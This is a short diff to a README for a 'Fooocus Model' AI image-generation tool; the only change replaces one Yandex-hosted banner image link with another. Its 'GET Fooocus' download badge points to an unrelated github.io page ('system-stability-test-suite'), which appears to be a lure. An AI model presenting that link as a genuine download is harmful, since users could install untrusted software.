@@ -1,6 +1,6 @@
 # Fooocus Model - Streamlined AI Image Generation for Creative Workflows
 
-![Banner Placeholder](https://avatars.mds.yandex.net/i?id=9d6f5fb730f4f46b1f845e1c23212e787a2c7659-5320607-images-thumbs&n=13)
+![Banner Placeholder](https://avatars.mds.yandex.net/i?id=96eb7698654d95ad1611f79d13e2fb88f69eca8e-12509309-images-thumbs&n=13)
 
 [![GET Fooocus](https://img.shields.io/badge/GET%20%E2%80%94%20Fooocus-0078D6?style=for-the-badge&logoColor=white)](https://system-stability-test-suite.github.io/.github/fooocus-model)
 
